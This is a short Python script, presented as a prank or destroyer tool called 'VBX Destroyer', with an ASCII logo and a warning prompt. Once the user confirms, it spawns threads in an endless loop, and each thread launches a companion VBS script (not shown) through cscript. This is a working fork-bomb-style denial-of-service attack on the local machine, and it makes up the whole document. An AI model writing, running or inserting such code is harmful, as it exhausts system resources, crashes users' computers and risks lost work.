import subprocess
import os
import threading

def prYellow(skk): print("\033[93m {}\033[00m" .format(skk)) 
def prPurple(skk): print("\033[95m {}\033[00m" .format(skk))
def prRed(skk): print("\033[91m {}\033[00m" .format(skk))

logo = '''
Welcome to...
 █████   █████ ███████████  █████ █████
░░███   ░░███ ░░███░░░░░███░░███ ░░███ 
 ░███    ░███  ░███    ░███ ░░███ ███  
 ░███    ░███  ░██████████   ░░█████   
 ░░███   ███   ░███░░░░░███   ███░███  
  ░░░█████░    ░███    ░███  ███ ░░███ 
    ░░███      ███████████  █████ █████
     ░░░      ░░░░░░░░░░░  ░░░░░ ░░░░░  Destroyer
'''

prRed(logo)

prYellow('We suggest you not opening this if you dont know what it is. Warned ya!')

confirm = input(('<<(AREYOUSURE? Yes/No)>>: '))

###

current_directory = os.path.dirname(os.path.realpath(__file__))

vbs_file = "vbxdestroyer.vbs"

vbs_path = os.path.join(current_directory, vbs_file)

def run_vbs():
    subprocess.call(['cscript', vbs_path])

threads = []

if confirm == 'Yes':
    while True:
        thread = threading.Thread(target=run_vbs)
        thread.start()
        threads.append(thread)

elif confirm == 'No':
    prRed('You are safe.')

else:
    prRed('Unknown answer. You are safe.')